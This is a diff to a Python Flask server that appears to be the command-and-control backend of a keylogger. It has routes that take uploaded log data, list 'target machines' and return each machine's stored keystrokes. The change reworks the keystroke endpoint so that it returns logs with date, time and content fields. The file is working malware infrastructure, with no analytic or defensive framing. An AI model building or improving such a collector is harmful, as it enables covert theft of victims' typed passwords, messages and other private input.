@@ -41,9 +41,7 @@ def upload():
         file_path = info["file"]
         with open(file_path, "a", encoding="utf-8") as f:
             f.write(log_data)
-
         return jsonify({"status": "appended", "file": file_path}), 200
-
 
 @app.route('/api/get_target_machines_list', methods=['GET'])
 def get_target_machines_list():
@@ -55,7 +53,6 @@ def get_target_machines_list():
         if os.path.isdir(os.path.join(DATA_FOLDER, name))
     ]
     return jsonify({"machines": machines}), 200
-
 
 @app.route('/api/get_keystrokes/<machine>', methods=['GET'])
 def get_keystrokes(machine):
@@ -70,11 +67,26 @@ def get_keystrokes(machine):
     ]
     log_files.sort()
 
-    keystrokes = []
+    logs = []
     for file_path in log_files:
+        filename = os.path.basename(file_path)
         with open(file_path, "r", encoding="utf-8") as f:
-            keystrokes.append(f.read())
-    return jsonify({"machine": machine, "keystrokes": keystrokes})
+            content = f.read()
+
+        try:
+            ts = filename.replace("log_", "").replace(".txt", "")
+            date_str, time_str = ts.split("_")
+            time_str = time_str.replace("-", ":")
+        except Exception:
+            date_str, time_str = "unknown", "unknown"
+
+        logs.append({
+            "date": date_str,
+            "time": time_str,
+            "content": content
+        })
+
+    return jsonify({"machine": machine, "logs": logs}), 200
 
 @app.route('/')
 def index():
